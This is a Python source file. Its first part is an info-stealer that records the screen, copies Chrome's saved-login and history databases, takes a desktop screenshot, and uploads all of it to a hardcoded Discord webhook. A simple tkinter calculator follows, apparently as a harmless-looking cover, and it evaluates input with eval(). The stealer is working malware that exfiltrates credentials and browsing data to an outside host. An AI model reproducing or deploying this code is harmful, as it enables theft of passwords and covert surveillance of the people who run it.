

import os
import time
import requests
import shutil
import subprocess
import getpass
import pyautogui
import cv2
import numpy as np

# Print a message indicating all libraries have been imported successfully
print("All libraries imported successfully!")

# Print the current working directory
print(f"Current working directory: {os.getcwd()}")

# Screen recording settings
SCREEN_SIZE = pyautogui.size()  # Automatically detect screen resolution
VIDEO_NAME = "screen_recording.mp4"
FPS = 3
RECORDING_TIME = 10  # Duration of the recording in seconds for testing purposes

def record_screen():
    print("Recording started!")

    # Start screen recording
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    try:
        out = cv2.VideoWriter(VIDEO_NAME, fourcc, FPS, (SCREEN_SIZE.width, SCREEN_SIZE.height))
        start_time = time.time()

        while (time.time() - start_time) < RECORDING_TIME:
            # Capture screen
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)

            # Write frame to video file
            out.write(frame)

            # Print debug information
            print(f"Recording frame at time: {time.time() - start_time:.1f} seconds")

            # Ensure the recording matches the FPS
            time.sleep(1 / FPS)

    except Exception as e:
        print(f"An error occurred during screen recording: {e}")

    finally:
        # Release video writer
        if out is not None:
            out.release()
        print("Recording finished! Saved as", VIDEO_NAME)

# Function to get Chrome passwords and history









def get_chrome_data():
    try:
        data_folder = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
        login_data = os.path.join(data_folder, 'Login Data')
        history_data = os.path.join(data_folder, 'History')

        # Copy Chrome data files to a temporary location
        temp_login_data = 'temp_login_data'
        temp_history_data = 'temp_history_data'
        shutil.copy(login_data, temp_login_data)
        shutil.copy(history_data, temp_history_data)

        # Send the data to the Discord webhook
        files = {'login_data': open(temp_login_data, 'rb'), 'history_data': open(temp_history_data, 'rb')}
        response = requests.post('https://discord.com/api/webhooks/1242837798998773851/262vT_Y3-wDbNuXNOsO8JDjtafrW6Y2Rg7Gol4XKsJGF1gVCYT95_EoA9Uw8gKzWJanG', files=files)
        
        if response.status_code == 204:
            print("Chrome data sent successfully.")
        else:
            print(f"Failed to send Chrome data. Status code: {response.status_code}")

        # Clean up temporary files
        os.remove(temp_login_data)
        os.remove(temp_history_data)

    except Exception as e:
        print(f"An error occurred while getting Chrome data: {e}")

# Function to take a screenshot of the desktop
def take_screenshot():
    try:
        screenshot_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'screenshot.png')
        pyautogui.screenshot(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"An error occurred while taking a screenshot: {e}")
        return None

# Main function to execute the script
def main():
    try:
        username = getpass.getuser()
        print(f"Executing script as user: {username}")

        # Record screen
        record_screen()

        # Get Chrome data
        get_chrome_data()

        # Take a screenshot
        screenshot_path = take_screenshot()
        
        # Send the screenshot to the Discord webhook
        if screenshot_path and os.path.exists(screenshot_path):
            files = {'screenshot': open(screenshot_path, 'rb')}
            response = requests.post('https://discord.com/api/webhooks/1242837798998773851/262vT_Y3-wDbNuXNOsO8JDjtafrW6Y2Rg7Gol4XKsJGF1gVCYT95_EoA9Uw8gKzWJanG', files=files)
            
            if response.status_code == 204:
                print("Screenshot sent successfully.")
            else:
                print(f"Failed to send screenshot. Status code: {response.status_code}")

    except Exception as e:
        print(f"An error occurred in main: {e}")

if __name__ == '__main__':
    main()








#     calculator


import tkinter as tk

class Calculator:
    def __init__(self, master):
        self.master = master
        master.title("Simple Calculator")

        self.entry = tk.Entry(master, width=20, font=('Arial', 30))
        self.entry.grid(row=0, column=0, columnspan=10, padx=10, pady=30)

        self.create_buttons()

    def create_buttons(self):
        buttons = [
            ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
            ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
            ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
            ('0', 4, 0), ('C', 4, 1), ('=', 4, 2), ('+', 4, 3),
        ]

        for (text, row, col) in buttons:
            button = tk.Button(self.master, text=text, width=10, height=4,
                               font=('Arial', 14),
                               command=lambda t=text: self.on_button_click(t))
            button.grid(row=row, column=col, padx=5, pady=5)

    def on_button_click(self, value):
        if value == '=':
            result = self.calculate()
            self.entry.delete(0, tk.END)
            self.entry.insert(tk.END, str(result))
        elif value == 'C':
            self.entry.delete(0, tk.END)
        else:
            self.entry.insert(tk.END, value)

    def calculate(self):
        try:
            expression = self.entry.get()
            result = eval(expression)
            return result
        except Exception as e:
            return "Error"

def main():
    root = tk.Tk()
    calculator = Calculator(root)
    root.mainloop()

if __name__ == "__main__":
    main()